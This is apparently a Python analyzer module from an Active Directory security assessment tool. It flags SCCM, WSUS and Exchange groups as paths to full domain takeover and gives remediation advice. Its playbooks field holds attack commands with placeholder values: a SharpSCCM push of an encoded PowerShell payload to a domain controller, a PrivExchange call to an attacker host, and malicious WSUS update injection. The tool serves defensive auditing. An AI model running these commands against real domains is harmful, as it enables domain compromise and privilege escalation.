#!/usr/bin/env python3
"""AD Infrastructure Abuse (SCCM, WSUS, Exchange)."""

from __future__ import annotations
from typing import Optional

from ..models import ObjectStore
from ..theme import Severity
from .base import BaseAnalyzer, Finding


class InfrastructureAnalyzer(BaseAnalyzer):
    name = "infrastructure_abuse"
    description = "Detect paths to full domain takeover via infrastructure components (SCCM, WSUS, Exchange)"

    def analyze(self, store: ObjectStore) -> Optional[Finding]:
        data = []
        
        # In a real BloodHound dataset, SCCM and Exchange would have specific properties or groups
        for group in store.iter_by_type("group"):
            name = group.name.lower()
            if "exchange trusted subsystem" in name or "exchange windows permissions" in name:
                data.append({"name": group.name, "type": "Exchange Group", "sid": group.sid})
            elif "sccm" in name or "mecm" in name or "endpoint_admins" in name:
                data.append({"name": group.name, "type": "SCCM Group", "sid": group.sid})
            elif "wsus" in name:
                data.append({"name": group.name, "type": "WSUS Group", "sid": group.sid})

        if not data:
            return None

        return Finding(
            title="Infrastructure Takeover Paths",
            summary=f"Found {len(data)} infrastructure groups (SCCM, WSUS, Exchange). Compromising these often leads to Domain Admin.",
            severity=Severity.CRITICAL,
            data=data,
            recommendation="Infrastructure Abuse Mapping",
            eli5="Core infrastructure like SCCM/MECM, WSUS, and Exchange often have overly permissive rights on domain objects. SCCM administrators can push malicious applications to Domain Controllers. Exchange Trusted Subsystem has WriteDacl on the domain object in some legacy configurations (PrivExchange). WSUS administrators can inject malicious updates (WSUSpect).",
            remediation="Enforce Tier-0 isolation for SCCM, WSUS, and Exchange. Remove overly permissive domain ACLs granted to Exchange (e.g., remove WriteDacl on domain root). Use HTTPS for WSUS to prevent update interception.",
            playbooks=[
                "# SCCM / MECM Abuse:\n# Use SharpSCCM to push an application to the DC:\nSharpSCCM.exe exec -d <DOMAIN> -s <SCCM_SERVER> -c <DEVICE_COLLECTION> -e 'cmd.exe /c powershell -enc <BASE64>'",
                "# Exchange Trusted Subsystem Escalation (PrivExchange):\n# Use PowerView to dump the ACL and look for WriteDacl on the domain object.\npython3 privexchange.py -ah <ATTACKER_HOST> <EXCHANGE_HOST>",
                "# WSUS Exploitation (WSUSpect):\n# Create a malicious update and push it via WSUSpect proxy."
            ]
        )
